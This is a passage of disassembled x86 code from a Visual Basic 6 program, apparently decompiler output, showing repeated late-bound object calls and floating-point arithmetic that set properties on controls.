0088226E: mov eax, [eax]
00882270: push var_000000DC
00882276: call [eax+40h]
00882279: fclex 
0088227B: mov var_000000E0, eax
00882281: cmp var_000000E0, 00000000h
00882288: jnl 8822AAh
0088228A: push 00000040h
0088228C: push 00440DE8h
00882291: push var_000000DC
00882297: push var_000000E0
0088229D: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008822A2: mov var_00000138, eax
008822A8: jmp 8822B1h
008822AA: and var_00000138, 00000000h
008822B1: mov eax, var_38
008822B4: mov var_00000110, eax
008822BA: and var_38, 00000000h
008822BE: push var_00000110
008822C4: lea eax, var_3C
008822C7: push eax
008822C8: call 00410A84h ; Set (object)
008822CD: push eax
008822CE: mov eax, var_000000E4
008822D4: mov eax, [eax]
008822D6: push var_000000E4
008822DC: call [eax+0Ch]
008822DF: fclex 
008822E1: mov var_000000E8, eax
008822E7: cmp var_000000E8, 00000000h
008822EE: jnl 882310h
008822F0: push 0000000Ch
008822F2: push 00440F1Ch
008822F7: push var_000000E4
008822FD: push var_000000E8
00882303: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00882308: mov var_0000013C, eax
0088230E: jmp 882317h
00882310: and var_0000013C, 00000000h
00882317: lea eax, var_3C
0088231A: push eax
0088231B: lea eax, var_34
0088231E: push eax
0088231F: push 00000002h
00882321: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
00882326: add esp, 0000000Ch
00882329: mov var_04, 0000000Ch
00882330: mov eax, [ebp+20h]
00882333: mov eax, [eax]
00882335: mov var_2C, eax
00882338: mov var_04, 0000000Dh
0088233F: mov eax, [ebp+1Ch]
00882342: mov var_58, eax
00882345: mov var_60, 00004003h
0088234C: mov eax, [ebp+08h]
0088234F: mov eax, [eax]
00882351: push [ebp+08h]
00882354: call [eax+00000308h]
0088235A: push eax
0088235B: lea eax, var_34
0088235E: push eax
0088235F: call 00410A84h ; Set (object)
00882364: mov var_000000DC, eax
0088236A: lea eax, var_38
0088236D: push eax
0088236E: mov eax, [ebp+20h]
00882371: mov ecx, [eax]
00882373: call 004108B0h ; msvbvm60.dll.__vbaI2I4
00882378: push eax
00882379: mov eax, var_000000DC
0088237F: mov eax, [eax]
00882381: push var_000000DC
00882387: call [eax+40h]
0088238A: fclex 
0088238C: mov var_000000E0, eax
00882392: cmp var_000000E0, 00000000h
00882399: jnl 8823BBh
0088239B: push 00000040h
0088239D: push 00440DE8h
008823A2: push var_000000DC
008823A8: push var_000000E0
008823AE: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008823B3: mov var_00000140, eax
008823B9: jmp 8823C2h
008823BB: and var_00000140, 00000000h
008823C2: push 00000010h
008823C4: pop eax
008823C5: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008823CA: lea esi, var_60
008823CD: mov edi, esp
008823CF: movsd 
008823D0: movsd 
008823D1: movsd 
008823D2: movsd 
008823D3: push 68030005h
008823D8: push var_38
008823DB: call 00410A72h ; msvbvm60.dll.__vbaLateIdSt
008823E0: lea eax, var_38
008823E3: push eax
008823E4: lea eax, var_34
008823E7: push eax
008823E8: push 00000002h
008823EA: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008823EF: add esp, 0000000Ch
008823F2: mov var_04, 0000000Eh
008823F9: mov eax, [ebp+18h]
008823FC: xor ecx, ecx
008823FE: cmp [eax], FFFFFFD8h
00882401: setle cl
00882404: mov eax, [ebp+18h]
00882407: xor edx, edx
00882409: cmp [eax], 00000028h
0088240C: setnl dl
0088240F: or ecx, edx
00882411: test ecx, ecx
00882413: jnz 882442h
00882415: mov var_04, 0000000Fh
0088241C: cmp [ebp+14h], FFFFFFECh
00882420: jle 882442h
00882422: cmp [ebp+14h], 00000014h
00882426: jnl 882442h
00882428: mov var_04, 00000010h
0088242F: mov eax, [ebp+18h]
00882432: mov eax, [eax]
00882434: add eax, 00000007h
00882437: jo 00883DB2h
0088243D: mov ecx, [ebp+18h]
00882440: mov [ecx], eax
00882442: mov var_04, 00000013h
00882449: mov eax, [ebp+18h]
0088244C: cmp [eax], 00000000h
0088244F: jl 00882643h
00882455: mov var_04, 00000014h
0088245C: fild dword ptr var_28
0088245F: fstp real8 ptr var_00000148
00882465: mov eax, var_28
00882468: imul eax, [ebp+14h]
0088246C: jo 00883DB2h
00882472: mov var_0000014C, eax
00882478: fild dword ptr var_0000014C
0088247E: fstp real8 ptr var_00000154
00882484: fld real8 ptr var_00000154
0088248A: cmp [008F2000h], 00000000h
00882491: jnz 88249Bh
00882493: fdiv real8 ptr [0040B998h]
00882499: jmp 8824ACh
0088249B: push [0040B99Ch]
008824A1: push [0040B998h]
008824A7: call 004106C4h ; msvbvm60.dll._adj_fdiv_m64
008824AC: fadd real8 ptr var_00000148
008824B2: fstp real4 ptr var_58
008824B5: fstsw ax
008824B7: test al, 0Dh
008824B9: jnz 00883DADh
008824BF: mov var_60, 00000004h
008824C6: fild dword ptr var_24
008824C9: fstp real8 ptr var_0000015C
008824CF: mov eax, [ebp+18h]
008824D2: mov ecx, var_24
008824D5: imul ecx, [eax]
008824D8: jo 00883DB2h
008824DE: mov var_00000160, ecx
008824E4: fild dword ptr var_00000160
008824EA: fstp real8 ptr var_00000168
008824F0: fld real8 ptr var_00000168
008824F6: cmp [008F2000h], 00000000h
008824FD: jnz 882507h
008824FF: fdiv real8 ptr [0040DBD0h]
00882505: jmp 882518h
00882507: push [0040DBD4h]
0088250D: push [0040DBD0h]
00882513: call 004106C4h ; msvbvm60.dll._adj_fdiv_m64
00882518: fsubr real8 ptr var_0000015C
0088251E: fadd real8 ptr [0040C1F8h]
00882524: fstp real8 ptr var_78
00882527: fstsw ax
00882529: test al, 0Dh
0088252B: jnz 00883DADh
00882531: mov var_80, 00000005h
00882538: and var_00000098, 00000000h
0088253F: mov var_000000A0, 00000002h
00882549: and var_000000B8, 00000000h
00882550: mov var_000000C0, 00000002h
0088255A: mov eax, [ebp+08h]
0088255D: mov eax, [eax]
0088255F: push [ebp+08h]
00882562: call [eax+00000308h]
00882568: push eax
00882569: lea eax, var_34
0088256C: push eax
0088256D: call 00410A84h ; Set (object)
00882572: mov var_000000DC, eax
00882578: lea eax, var_38
0088257B: push eax
0088257C: mov eax, [ebp+20h]
0088257F: mov ecx, [eax]
00882581: call 004108B0h ; msvbvm60.dll.__vbaI2I4
00882586: push eax
00882587: mov eax, var_000000DC
0088258D: mov eax, [eax]
0088258F: push var_000000DC
00882595: call [eax+40h]
00882598: fclex 
0088259A: mov var_000000E0, eax
008825A0: cmp var_000000E0, 00000000h
008825A7: jnl 8825C9h
008825A9: push 00000040h
008825AB: push 00440DE8h
008825B0: push var_000000DC
008825B6: push var_000000E0
008825BC: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008825C1: mov var_0000016C, eax
008825C7: jmp 8825D0h
008825C9: and var_0000016C, 00000000h
008825D0: push 00000010h
008825D2: pop eax
008825D3: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008825D8: lea esi, var_60
008825DB: mov edi, esp
008825DD: movsd 
008825DE: movsd 
008825DF: movsd 
008825E0: movsd 
008825E1: push 00000010h
008825E3: pop eax
008825E4: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008825E9: lea esi, var_80
008825EC: mov edi, esp
008825EE: movsd 
008825EF: movsd 
008825F0: movsd 
008825F1: movsd 
008825F2: push 00000010h
008825F4: pop eax
008825F5: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008825FA: lea esi, var_000000A0
00882600: mov edi, esp
00882602: movsd 
00882603: movsd 
00882604: movsd 
00882605: movsd 
00882606: push 00000010h
00882608: pop eax
00882609: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0088260E: lea esi, var_000000C0
00882614: mov edi, esp
00882616: movsd 
00882617: movsd 
00882618: movsd 
00882619: movsd 
0088261A: push 00000004h
0088261C: push 80011001h
00882621: push var_38
00882624: call 00410A2Ah ; msvbvm60.dll.__vbaLateIdCall
00882629: add esp, 0000004Ch
0088262C: lea eax, var_38
0088262F: push eax
00882630: lea eax, var_34
00882633: push eax
00882634: push 00000002h
00882636: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0088263B: add esp, 0000000Ch
0088263E: jmp 0088282Ch
00882643: mov var_04, 00000016h
0088264A: fild dword ptr var_28
0088264D: fstp real8 ptr var_00000174
00882653: mov eax, var_28
00882656: imul eax, [ebp+14h]
0088265A: jo 00883DB2h
00882660: mov var_00000178, eax
00882666: fild dword ptr var_00000178
0088266C: fstp real8 ptr var_00000180
00882672: fld real8 ptr var_00000180
00882678: cmp [008F2000h], 00000000h
0088267F: jnz 882689h
00882681: fdiv real8 ptr [0040B998h]
00882687: jmp 88269Ah
00882689: push [0040B99Ch]
0088268F: push [0040B998h]
00882695: call 004106C4h ; msvbvm60.dll._adj_fdiv_m64
0088269A: fadd real8 ptr var_00000174
008826A0: fstp real4 ptr var_58
008826A3: fstsw ax
008826A5: test al, 0Dh
008826A7: jnz 00883DADh
008826AD: mov var_60, 00000004h
008826B4: fild dword ptr var_24
008826B7: fstp real8 ptr var_00000188
008826BD: mov eax, [ebp+18h]
008826C0: mov ecx, var_24
008826C3: imul ecx, [eax]
008826C6: jo 00883DB2h
008826CC: mov var_0000018C, ecx
008826D2: fild dword ptr var_0000018C
008826D8: fstp real8 ptr var_00000194
008826DE: fld real8 ptr var_00000194
008826E4: cmp [008F2000h], 00000000h
008826EB: jnz 8826F5h
008826ED: fdiv real8 ptr [0040DBD0h]
008826F3: jmp 882706h
008826F5: push [0040DBD4h]
008826FB: push [0040DBD0h]
00882701: call 004106C4h ; msvbvm60.dll._adj_fdiv_m64
00882706: fsubr real8 ptr var_00000188
0088270C: fsub real8 ptr [0040DBC8h]
00882712: fstp real8 ptr var_78
00882715: fstsw ax
00882717: test al, 0Dh
00882719: jnz 00883DADh
0088271F: mov var_80, 00000005h
00882726: and var_00000098, 00000000h
0088272D: mov var_000000A0, 00000002h
00882737: and var_000000B8, 00000000h
0088273E: mov var_000000C0, 00000002h
00882748: mov eax, [ebp+08h]
0088274B: mov eax, [eax]
0088274D: push [ebp+08h]
00882750: call [eax+00000308h]
00882756: push eax
00882757: lea eax, var_34
0088275A: push eax
0088275B: call 00410A84h ; Set (object)
00882760: mov var_000000DC, eax
00882766: lea eax, var_38
00882769: push eax
0088276A: mov eax, [ebp+20h]
0088276D: mov ecx, [eax]
0088276F: call 004108B0h ; msvbvm60.dll.__vbaI2I4
00882774: push eax
00882775: mov eax, var_000000DC
0088277B: mov eax, [eax]
0088277D: push var_000000DC
00882783: call [eax+40h]
00882786: fclex 
00882788: mov var_000000E0, eax
0088278E: cmp var_000000E0, 00000000h
00882795: jnl 8827B7h
00882797: push 00000040h
00882799: push 00440DE8h
0088279E: push var_000000DC
008827A4: push var_000000E0
008827AA: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008827AF: mov var_00000198, eax
008827B5: jmp 8827BEh
008827B7: and var_00000198, 00000000h
008827BE: push 00000010h
008827C0: pop eax
008827C1: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008827C6: lea esi, var_60
008827C9: mov edi, esp
008827CB: movsd 
008827CC: movsd 
008827CD: movsd 
008827CE: movsd 
008827CF: push 00000010h
008827D1: pop eax
008827D2: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008827D7: lea esi, var_80
008827DA: mov edi, esp
008827DC: movsd 
008827DD: movsd 
008827DE: movsd 
008827DF: movsd 
008827E0: push 00000010h
008827E2: pop eax
008827E3: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008827E8: lea esi, var_000000A0
008827EE: mov edi, esp
008827F0: movsd 
008827F1: movsd 
008827F2: movsd 
008827F3: movsd 
008827F4: push 00000010h
008827F6: pop eax
008827F7: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008827FC: lea esi, var_000000C0
00882802: mov edi, esp
00882804: movsd 
00882805: movsd 
00882806: movsd 
00882807: movsd 
00882808: push 00000004h
0088280A: push 80011001h
0088280F: push var_38
00882812: call 00410A2Ah ; msvbvm60.dll.__vbaLateIdCall
00882817: add esp, 0000004Ch
0088281A: lea eax, var_38
0088281D: push eax
0088281E: lea eax, var_34
00882821: push eax
00882822: push 00000002h
00882824: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
00882829: add esp, 0000000Ch
0088282C: mov var_04, 00000018h
00882833: mov eax, [ebp+08h]
00882836: mov eax, [eax]
00882838: push [ebp+08h]
0088283B: call [eax+00000314h]
00882841: push eax
00882842: lea eax, var_3C
00882845: push eax
00882846: call 00410A84h ; Set (object)
0088284B: mov var_000000E4, eax
00882851: lea eax, var_40
00882854: push eax
00882855: mov eax, [ebp+20h]
00882858: mov ecx, [eax]
0088285A: call 004108B0h ; msvbvm60.dll.__vbaI2I4
0088285F: push eax
00882860: mov eax, var_000000E4
00882866: mov eax, [eax]
00882868: push var_000000E4
0088286E: call [eax+40h]
00882871: fclex 
00882873: mov var_000000E8, eax
00882879: cmp var_000000E8, 00000000h
00882880: jnl 8828A2h
00882882: push 00000040h
00882884: push 00440DE8h
00882889: push var_000000E4
0088288F: push var_000000E8
00882895: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0088289A: mov var_0000019C, eax
008828A0: jmp 8828A9h
008828A2: and var_0000019C, 00000000h
008828A9: mov eax, var_40
008828AC: mov var_000000EC, eax
008828B2: mov eax, [ebp+08h]
008828B5: mov eax, [eax]
008828B7: push [ebp+08h]
008828BA: call [eax+00000308h]
008828C0: push eax
008828C1: lea eax, var_34
008828C4: push eax
008828C5: call 00410A84h ; Set (object)
008828CA: mov var_000000DC, eax
008828D0: lea eax, var_38
008828D3: push eax
008828D4: mov eax, [ebp+20h]
008828D7: mov ecx, [eax]
008828D9: call 004108B0h ; msvbvm60.dll.__vbaI2I4
008828DE: push eax
008828DF: mov eax, var_000000DC
008828E5: mov eax, [eax]
008828E7: push var_000000DC
008828ED: call [eax+40h]
008828F0: fclex 
008828F2: mov var_000000E0, eax
008828F8: cmp var_000000E0, 00000000h
008828FF: jnl 882921h
00882901: push 00000040h
00882903: push 00440DE8h
00882908: push var_000000DC
0088290E: push var_000000E0
00882914: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00882919: mov var_000001A0, eax
0088291F: jmp 882928h
00882921: and var_000001A0, 00000000h
00882928: push 00000000h
0088292A: push 80010003h
0088292F: push var_38
00882932: lea eax, var_50
00882935: push eax
00882936: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0088293B: add esp, 00000010h
0088293E: push eax
0088293F: call 004107EAh ; msvbvm60.dll.__vbaR4Var
00882944: push ecx
00882945: fstp real4 ptr [esp]
00882948: mov eax, var_000000EC
0088294E: mov eax, [eax]
00882950: push var_000000EC
00882956: call [eax+64h]
00882959: fclex 
0088295B: mov var_000000F0, eax
00882961: cmp var_000000F0, 00000000h
00882968: jnl 88298Ah
0088296A: push 00000064h
0088296C: push 00456A8Ch
00882971: push var_000000EC
00882977: push var_000000F0
0088297D: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00882982: mov var_000001A4, eax
00882988: jmp 882991h
0088298A: and var_000001A4, 00000000h
00882991: lea eax, var_40
00882994: push eax
00882995: lea eax, var_3C
00882998: push eax
00882999: lea eax, var_38
0088299C: push eax
0088299D: lea eax, var_34
008829A0: push eax
008829A1: push 00000004h
008829A3: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008829A8: add esp, 00000014h
008829AB: lea ecx, var_50
008829AE: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
008829B3: mov var_04, 00000019h
008829BA: mov eax, [ebp+08h]
008829BD: mov eax, [eax]
008829BF: push [ebp+08h]
008829C2: call [eax+00000314h]
008829C8: push eax
008829C9: lea eax, var_3C
008829CC: push eax
008829CD: call 00410A84h ; Set (object)
008829D2: mov var_000000E4, eax
008829D8: lea eax, var_40
008829DB: push eax
008829DC: mov eax, [ebp+20h]
008829DF: mov ecx, [eax]
008829E1: call 004108B0h ; msvbvm60.dll.__vbaI2I4
008829E6: push eax
008829E7: mov eax, var_000000E4
008829ED: mov eax, [eax]
008829EF: push var_000000E4
008829F5: call [eax+40h]
008829F8: fclex 
008829FA: mov var_000000E8, eax
00882A00: cmp var_000000E8, 00000000h
00882A07: jnl 882A29h
00882A09: push 00000040h
00882A0B: push 00440DE8h
00882A10: push var_000000E4
00882A16: push var_000000E8
00882A1C: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00882A21: mov var_000001A8, eax
00882A27: jmp 882A30h
00882A29: and var_000001A8, 00000000h
00882A30: mov eax, var_40
00882A33: mov var_000000EC, eax
00882A39: mov eax, [ebp+08h]
00882A3C: mov eax, [eax]
00882A3E: push [ebp+08h]
00882A41: call [eax+0000030Ch]
00882A47: push eax
00882A48: lea eax, var_34
00882A4B: push eax
00882A4C: call 00410A84h ; Set (object)
00882A51: mov var_000000DC, eax
00882A57: lea eax, var_38
00882A5A: push eax
00882A5B: mov eax, [ebp+1Ch]
00882A5E: mov ecx, [eax]
00882A60: call 004108B0h ; msvbvm60.dll.__vbaI2I4
00882A65: push eax
00882A66: mov eax, var_000000DC
00882A6C: mov eax, [eax]
00882A6E: push var_000000DC
00882A74: call [eax+40h]
00882A77: fclex 
00882A79: mov var_000000E0, eax
00882A7F: cmp var_000000E0, 00000000h
00882A86: jnl 882AA8h
00882A88: push 00000040h
00882A8A: push 00440DE8h
00882A8F: push var_000000DC
00882A95: push var_000000E0
00882A9B: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00882AA0: mov var_000001AC, eax
00882AA6: jmp 882AAFh
00882AA8: and var_000001AC, 00000000h
00882AAF: push 00000000h
00882AB1: push 80010003h
00882AB6: push var_38
00882AB9: lea eax, var_50
00882ABC: push eax
00882ABD: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00882AC2: add esp, 00000010h
00882AC5: push eax
00882AC6: call 004107EAh ; msvbvm60.dll.__vbaR4Var
00882ACB: push ecx
00882ACC: fstp real4 ptr [esp]
00882ACF: mov eax, var_000000EC
00882AD5: mov eax, [eax]
00882AD7: push var_000000EC
00882ADD: call [eax+74h]
00882AE0: fclex 
00882AE2: mov var_000000F0, eax
00882AE8: cmp var_000000F0, 00000000h
00882AEF: jnl 882B11h
00882AF1: push 00000074h
00882AF3: push 00456A8Ch
00882AF8: push var_000000EC
00882AFE: push var_000000F0
00882B04: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00882B09: mov var_000001B0, eax
00882B0F: jmp 882B18h
00882B11: and var_000001B0, 00000000h
00882B18: lea eax, var_40
00882B1B: push eax
00882B1C: lea eax, var_3C
00882B1F: push eax
00882B20: lea eax, var_38
00882B23: push eax
00882B24: lea eax, var_34
00882B27: push eax
00882B28: push 00000004h
00882B2A: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
00882B2F: add esp, 00000014h
00882B32: lea ecx, var_50
00882B35: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
00882B3A: mov var_04, 0000001Ah
00882B41: mov eax, [ebp+08h]
00882B44: mov eax, [eax]
00882B46: push [ebp+08h]
00882B49: call [eax+00000314h]
00882B4F: push eax
00882B50: lea eax, var_3C
00882B53: push eax
00882B54: call 00410A84h ; Set (object)
00882B59: mov var_000000E4, eax
00882B5F: lea eax, var_40
00882B62: push eax
00882B63: mov eax, [ebp+20h]
00882B66: mov ecx, [eax]
00882B68: call 004108B0h ; msvbvm60.dll.__vbaI2I4
00882B6D: push eax
00882B6E: mov eax, var_000000E4
00882B74: mov eax, [eax]
00882B76: push var_000000E4
00882B7C: call [eax+40h]
00882B7F: fclex 
00882B81: mov var_000000E8, eax
00882B87: cmp var_000000E8, 00000000h
00882B8E: jnl 882BB0h
00882B90: push 00000040h
00882B92: push 00440DE8h
00882B97: push var_000000E4
00882B9D: push var_000000E8
00882BA3: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00882BA8: mov var_000001B4, eax
00882BAE: jmp 882BB7h
00882BB0: and var_000001B4, 00000000h
00882BB7: mov eax, var_40
00882BBA: mov var_000000EC, eax
00882BC0: mov eax, [ebp+08h]
00882BC3: mov eax, [eax]
00882BC5: push [ebp+08h]
00882BC8: call [eax+00000308h]
00882BCE: push eax
00882BCF: lea eax, var_34
00882BD2: push eax
00882BD3: call 00410A84h ; Set (object)
00882BD8: mov var_000000DC, eax
00882BDE: lea eax, var_38
00882BE1: push eax
00882BE2: mov eax, [ebp+20h]
00882BE5: mov ecx, [eax]
00882BE7: call 004108B0h ; msvbvm60.dll.__vbaI2I4
00882BEC: push eax
00882BED: mov eax, var_000000DC
00882BF3: mov eax, [eax]
00882BF5: push var_000000DC
00882BFB: call [eax+40h]
00882BFE: fclex 
00882C00: mov var_000000E0, eax
00882C06: cmp var_000000E0, 00000000h
00882C0D: jnl 882C2Fh
00882C0F: push 00000040h
00882C11: push 00440DE8h
00882C16: push var_000000DC
00882C1C: push var_000000E0
00882C22: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00882C27: mov var_000001B8, eax
00882C2D: jmp 882C36h
00882C2F: and var_000001B8, 00000000h
00882C36: push 00000000h
00882C38: push 80010004h
00882C3D: push var_38
00882C40: lea eax, var_50
00882C43: push eax
00882C44: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00882C49: add esp, 00000010h
00882C4C: push eax
00882C4D: call 004107EAh ; msvbvm60.dll.__vbaR4Var
00882C52: push ecx
00882C53: fstp real4 ptr [esp]
00882C56: mov eax, var_000000EC
00882C5C: mov eax, [eax]
00882C5E: push var_000000EC
00882C64: call [eax+6Ch]
00882C67: fclex 
00882C69: mov var_000000F0, eax
00882C6F: cmp var_000000F0, 00000000h
00882C76: jnl 882C98h
00882C78: push 0000006Ch
00882C7A: push 00456A8Ch
00882C7F: push var_000000EC
00882C85: push var_000000F0
00882C8B: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00882C90: mov var_000001BC, eax
00882C96: jmp 882C9Fh
00882C98: and var_000001BC, 00000000h
00882C9F: lea eax, var_40
00882CA2: push eax
00882CA3: lea eax, var_3C
00882CA6: push eax
00882CA7: lea eax, var_38
00882CAA: push eax
00882CAB: lea eax, var_34
00882CAE: push eax
00882CAF: push 00000004h
00882CB1: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
00882CB6: add esp, 00000014h
00882CB9: lea ecx, var_50
00882CBC: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
00882CC1: mov var_04, 0000001Bh
00882CC8: mov eax, [ebp+08h]
00882CCB: mov eax, [eax]
00882CCD: push [ebp+08h]
00882CD0: call [eax+00000314h]
00882CD6: push eax
00882CD7: lea eax, var_3C
00882CDA: push eax
00882CDB: call 00410A84h ; Set (object)
00882CE0: mov var_000000E4, eax
00882CE6: lea eax, var_40
00882CE9: push eax
00882CEA: mov eax, [ebp+20h]
00882CED: mov ecx, [eax]
00882CEF: call 004108B0h ; msvbvm60.dll.__vbaI2I4
00882CF4: push eax
00882CF5: mov eax, var_000000E4
00882CFB: mov eax, [eax]
00882CFD: push var_000000E4
00882D03: call [eax+40h]
00882D06: fclex 
00882D08: mov var_000000E8, eax
00882D0E: cmp var_000000E8, 00000000h
00882D15: jnl 882D37h
00882D17: push 00000040h
00882D19: push 00440DE8h
00882D1E: push var_000000E4
00882D24: push var_000000E8
00882D2A: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00882D2F: mov var_000001C0, eax
00882D35: jmp 882D3Eh
00882D37: and var_000001C0, 00000000h
00882D3E: mov eax, var_40
00882D41: mov var_000000EC, eax
00882D47: mov eax, [ebp+08h]
00882D4A: mov eax, [eax]
00882D4C: push [ebp+08h]
00882D4F: call [eax+0000030Ch]
00882D55: push eax
00882D56: lea eax, var_34
00882D59: push eax
00882D5A: call 00410A84h ; Set (object)
00882D5F: mov var_000000DC, eax
00882D65: lea eax, var_38
00882D68: push eax
00882D69: mov eax, [ebp+1Ch]
00882D6C: mov ecx, [eax]
00882D6E: call 004108B0h ; msvbvm60.dll.__vbaI2I4
00882D73: push eax
00882D74: mov eax, var_000000DC
00882D7A: mov eax, [eax]
00882D7C: push var_000000DC
00882D82: call [eax+40h]
00882D85: fclex 
00882D87: mov var_000000E0, eax
00882D8D: cmp var_000000E0, 00000000h
00882D94: jnl 882DB6h
00882D96: push 00000040h
00882D98: push 00440DE8h
00882D9D: push var_000000DC
00882DA3: push var_000000E0
00882DA9: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00882DAE: mov var_000001C4, eax
00882DB4: jmp 882DBDh
00882DB6: and var_000001C4, 00000000h
00882DBD: push 00000000h
00882DBF: push 80010004h
00882DC4: push var_38
00882DC7: lea eax, var_50
00882DCA: push eax
00882DCB: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00882DD0: add esp, 00000010h
00882DD3: push eax
00882DD4: call 004107EAh ; msvbvm60.dll.__vbaR4Var
00882DD9: push ecx
00882DDA: fstp real4 ptr [esp]
00882DDD: mov eax, var_000000EC
00882DE3: mov eax, [eax]
00882DE5: push var_000000EC
00882DEB: call [eax+7Ch]
00882DEE: fclex 
00882DF0: mov var_000000F0, eax
00882DF6: cmp var_000000F0, 00000000h
00882DFD: jnl 882E1Fh
00882DFF: push 0000007Ch
00882E01: push 00456A8Ch
00882E06: push var_000000EC
00882E0C: push var_000000F0
00882E12: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00882E17: mov var_000001C8, eax
00882E1D: jmp 882E26h
00882E1F: and var_000001C8, 00000000h
00882E26: lea eax, var_40
00882E29: push eax
00882E2A: lea eax, var_3C
00882E2D: push eax
00882E2E: lea eax, var_38
00882E31: push eax
00882E32: lea eax, var_34
00882E35: push eax
00882E36: push 00000004h
00882E38: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
00882E3D: add esp, 00000014h
00882E40: lea ecx, var_50
00882E43: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
00882E48: mov var_04, 0000001Ch
00882E4F: mov eax, [ebp+08h]
00882E52: mov eax, [eax]
00882E54: push [ebp+08h]
00882E57: call [eax+00000314h]
00882E5D: push eax
00882E5E: lea eax, var_34
00882E61: push eax
00882E62: call 00410A84h ; Set (object)
00882E67: mov var_000000DC, eax
00882E6D: lea eax, var_38
00882E70: push eax
00882E71: mov eax, [ebp+20h]
00882E74: mov ecx, [eax]
00882E76: call 004108B0h ; msvbvm60.dll.__vbaI2I4
00882E7B: push eax
00882E7C: mov eax, var_000000DC
00882E82: mov eax, [eax]
00882E84: push var_000000DC
00882E8A: call [eax+40h]
00882E8D: fclex 
00882E8F: mov var_000000E0, eax
00882E95: cmp var_000000E0, 00000000h
00882E9C: jnl 882EBEh
00882E9E: push 00000040h
00882EA0: push 00440DE8h
00882EA5: push var_000000DC
00882EAB: push var_000000E0
00882EB1: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00882EB6: mov var_000001CC, eax
00882EBC: jmp 882EC5h
00882EBE: and var_000001CC, 00000000h
00882EC5: mov eax, var_38
00882EC8: mov var_000000E4, eax
00882ECE: push FFFFFFFFh
00882ED0: mov eax, var_000000E4
00882ED6: mov eax, [eax]
00882ED8: push var_000000E4
00882EDE: call [eax+00000084h]
00882EE4: fclex 
00882EE6: mov var_000000E8, eax
00882EEC: cmp var_000000E8, 00000000h
00882EF3: jnl 882F18h
00882EF5: push 00000084h
00882EFA: push 00456A8Ch
00882EFF: push var_000000E4
00882F05: push var_000000E8
00882F0B: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00882F10: mov var_000001D0, eax
00882F16: jmp 882F1Fh
00882F18: and var_000001D0, 00000000h
00882F1F: lea eax, var_38
00882F22: push eax
00882F23: lea eax, var_34
00882F26: push eax
00882F27: push 00000002h
00882F29: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
00882F2E: add esp, 0000000Ch
00882F31: mov var_04, 0000001Dh
00882F38: mov eax, [ebp+20h]
00882F3B: mov var_58, eax
00882F3E: mov var_60, 00004003h
00882F45: mov eax, [ebp+08h]
00882F48: mov eax, [eax]
00882F4A: push [ebp+08h]
00882F4D: call [eax+00000308h]
00882F53: push eax
00882F54: lea eax, var_34
00882F57: push eax
00882F58: call 00410A84h ; Set (object)
00882F5D: mov var_000000DC, eax
00882F63: lea eax, var_38
00882F66: push eax
00882F67: mov eax, [ebp+20h]
00882F6A: mov ecx, [eax]
00882F6C: call 004108B0h ; msvbvm60.dll.__vbaI2I4
00882F71: push eax
00882F72: mov eax, var_000000DC
00882F78: mov eax, [eax]
00882F7A: push var_000000DC
00882F80: call [eax+40h]
00882F83: fclex 
00882F85: mov var_000000E0, eax
00882F8B: cmp var_000000E0, 00000000h
00882F92: jnl 882FB4h
00882F94: push 00000040h
00882F96: push 00440DE8h
00882F9B: push var_000000DC
00882FA1: push var_000000E0
00882FA7: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00882FAC: mov var_000001D4, eax
00882FB2: jmp 882FBBh
00882FB4: and var_000001D4, 00000000h
00882FBB: push 00000010h
00882FBD: pop eax
00882FBE: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00882FC3: lea esi, var_60
00882FC6: mov edi, esp
00882FC8: movsd 
00882FC9: movsd 
00882FCA: movsd 
00882FCB: movsd 
00882FCC: push 68030001h
00882FD1: push var_38
00882FD4: call 00410A72h ; msvbvm60.dll.__vbaLateIdSt
00882FD9: lea eax, var_38
00882FDC: push eax
00882FDD: lea eax, var_34
00882FE0: push eax
00882FE1: push 00000002h
00882FE3: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
00882FE8: add esp, 0000000Ch
